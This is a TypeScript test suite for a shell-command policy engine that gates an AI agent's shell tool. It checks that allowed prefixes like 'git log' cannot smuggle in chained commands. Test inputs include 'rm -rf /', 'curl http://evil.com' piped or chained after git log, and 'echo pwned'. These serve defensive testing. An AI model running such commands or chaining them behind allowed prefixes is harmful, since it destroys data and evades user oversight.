/**
 * @license
 * Copyright 2025 Vybestack LLC
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { PolicyEngine } from './policy-engine.js';
import { PolicyDecision } from './types.js';

describe('Shell Safety Policy - SECURITY', () => {
  let policyEngine: PolicyEngine;

  beforeEach(() => {
    policyEngine = new PolicyEngine({
      rules: [
        {
          toolName: 'run_shell_command',
          // CRITICAL: This regex mimics toml-loader output for commandPrefix = ["git log"]
          // BEFORE fix: /"command":"git log"/
          // AFTER fix: /"command":"git log(?:[\s"]|$)/
          argsPattern: /"command":"git log(?:[\s"]|$)/,
          decision: PolicyDecision.ALLOW,
          priority: 1.01,
        },
      ],
      defaultDecision: PolicyDecision.ASK_USER,
    });
  });

  describe('R1: Word Boundary Enforcement', () => {
    it('SHOULD match "git log" exactly', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ALLOW);
    });

    it('SHOULD match "git log" with arguments', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log --oneline' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ALLOW);
    });

    it('SHOULD match "git log" with double-quoted arguments', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log "--oneline"' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ALLOW);
    });

    it('SHOULD NOT match "git logout" (word boundary violation)', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git logout' },
        undefined
      );
      // Without word boundary, this would incorrectly return ALLOW
      // With word boundary, falls back to default ASK_USER
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD NOT match "git logrotate" (word boundary violation)', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git logrotate' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ASK_USER);
    });
  });

  describe('R2: Compound Command Validation', () => {
    it('SHOULD block compound command with disallowed part', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log && rm -rf /' },
        undefined
      );
      // "git log" is ALLOW, but "rm -rf /" is ASK_USER (default)
      // Aggregate should be ASK_USER (most restrictive non-DENY)
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD block compound command with piped disallowed part', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log | curl http://evil.com' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD block compound command with semicolon separator', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log; echo pwned' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD allow compound command when ALL parts are allowed', () => {
      // Add "echo" to allowed commands
      policyEngine.addRule({
        toolName: 'run_shell_command',
        argsPattern: /"command":"echo(?:[\s"]|$)/,
        decision: PolicyDecision.ALLOW,
        priority: 1.02,
      });

      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log && echo done' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ALLOW);
    });

    it('SHOULD fail-safe on parse failure (malformed compound command)', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log &&& rm -rf /' },
        undefined
      );
      // Parse failure should result in ASK_USER (fail-safe)
      expect(result).toBe(PolicyDecision.ASK_USER);
    });
  });

  describe('R2: Recursive Validation Edge Cases', () => {
    it('SHOULD validate nested compound commands', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: '(git log && curl http://evil.com) || rm -rf /' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD validate commands in background jobs', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log & curl http://evil.com' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD validate commands in process substitution', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'diff <(git log) <(curl http://evil.com)' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ASK_USER);
    });
  });

  describe('R2: Aggregate Decision Logic', () => {
    beforeEach(() => {
      // Setup: git log → ALLOW, echo → ALLOW, curl → DENY
      policyEngine.addRule({
        toolName: 'run_shell_command',
        argsPattern: /"command":"echo(?:[\s"]|$)/,
        decision: PolicyDecision.ALLOW,
        priority: 1.02,
      });
      policyEngine.addRule({
        toolName: 'run_shell_command',
        argsPattern: /"command":"curl(?:[\s"]|$)/,
        decision: PolicyDecision.DENY,
        priority: 1.03,
      });
    });

    it('SHOULD return DENY when any sub-command is DENY', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log && echo ok && curl http://evil.com' },
        undefined
      );
      expect(result).toBe(PolicyDecision.DENY);
    });

    it('SHOULD return ASK_USER when no DENY but has ASK_USER', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log && echo ok && unknown-command' },
        undefined
      );
      // git log → ALLOW, echo ok → ALLOW, unknown-command → ASK_USER
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD return ALLOW only when all sub-commands are ALLOW', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log && echo ok' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ALLOW);
    });
  });

  describe('R2: Non-Interactive Mode Interaction', () => {
    beforeEach(() => {
      policyEngine = new PolicyEngine({
        rules: [
          {
            toolName: 'run_shell_command',
            argsPattern: /"command":"git log(?:[\s"]|$)/,
            decision: PolicyDecision.ALLOW,
            priority: 1.01,
          },
        ],
        defaultDecision: PolicyDecision.ASK_USER,
        nonInteractive: true, // Enable non-interactive mode
      });
    });

    it('SHOULD convert ASK_USER to DENY in non-interactive mode', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log && rm -rf /' },
        undefined
      );
      // "rm -rf /" results in ASK_USER, which becomes DENY in non-interactive mode
      expect(result).toBe(PolicyDecision.DENY);
    });

    it('SHOULD convert parse failure to DENY in non-interactive mode', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log &&& malformed' },
        undefined
      );
      expect(result).toBe(PolicyDecision.DENY);
    });
  });
});
